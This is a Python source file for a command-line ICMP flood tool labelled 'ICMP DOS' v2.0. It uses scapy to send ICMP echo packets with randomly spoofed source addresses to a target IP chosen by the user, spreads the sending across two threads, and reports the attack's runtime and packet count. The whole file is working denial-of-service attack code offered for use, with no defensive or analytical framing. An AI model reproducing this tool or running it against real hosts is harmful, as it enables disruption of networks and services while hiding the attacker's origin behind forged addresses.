from scapy.all import *;
from scapy.layers.inet import *
from random import randint,choice
from threading import Thread
import time

data_package_number = 0

class IFD():
    def __init__(self):
        pass
    def icmp_dos_log(self):
        log ="""
          ___ ____ __  __ ____    ____   ___  ____     options:
         |_ _/ ___|  \/  |  _ \  |  _ \ / _ \/ ___|      --appoint ip:
          | | |   | |\/| | |_) | | | | | | | \___ \\              -d >> -d[objective ip]
          | | |___| |  | |  __/  | |_| | |_| |___) |     --appoint send package number(recommend even):
         |___\____|_|  |_|_|     |____/ \___/|____/               -o >> -o[number]
            -------------------------------
            version: v_2.0 author:Lalevin Martin
            -------------------------------
        """
        return log

    def create_ip(self):
        from ipaddress import ip_network
        self.ip_pool = []
        r_ip = ip_network(f"{randint(0,255)}.{randint(0,255)}.{randint(0,255)}.0/24")
        for ip in r_ip:
            self.ip_pool.append(ip)
        return str(choice(self.ip_pool))

    def send_data_package(self,ip_dst,sp_num):
        global data_package_number
        sp_num = int(int(sp_num)/2)
        # ip_src = self.create_ip()
        for i in range(sp_num):
            ip_src = self.create_ip()
            data_package = IP(src = ip_src , dst = ip_dst , id = randint(1000,2000))/ICMP(id = randint(1000,2000) , seq = randint(1000,2000))
            send(data_package,verbose=False)
            print(f"[+]rip:{ip_src}--->dip:{ip_dst} Ok !")
            data_package_number+=1
        if sp_num%2 != 0:
            ip_src = self.create_ip()
            data_package = IP(src=ip_src, dst=ip_dst, id=randint(1000, 2000)) / ICMP(id=randint(1000, 2000),seq=randint(1000, 2000))
            send(data_package, verbose=False)
            print(f"[+]rip:{ip_src}--->dip:{ip_dst} Ok !")
            data_package_number += 1


def main():
    import sys
    icmp_flood_dos = IFD()
    print(icmp_flood_dos.icmp_dos_log())
    try:
        if sys.argv[1] == "-d" and sys.argv[3] == "-o":
            time_1 = time.time()
            thread_pool = []
            for thread in range(2):
                dos_thread = Thread(target=icmp_flood_dos.send_data_package,args=(sys.argv[2],sys.argv[4]))
                dos_thread.start()
                thread_pool.append(dos_thread)
            for tp in thread_pool:
                tp.join()
            time_2 = time.time()
            times = time_2-time_1
            print(f"\r\n[*]The runtime of this attack is:({times}) second !")
            print("[+]data package number is: ",data_package_number)
        else:
            print("[Error Type] options type is error !")
            time.sleep(1)
    except:
        if len(sys.argv) == 1:
            pass
        else:
            print("[Error Options] options is error !")
            time.sleep(1)
if __name__ == '__main__':
    main()
    time.sleep(2)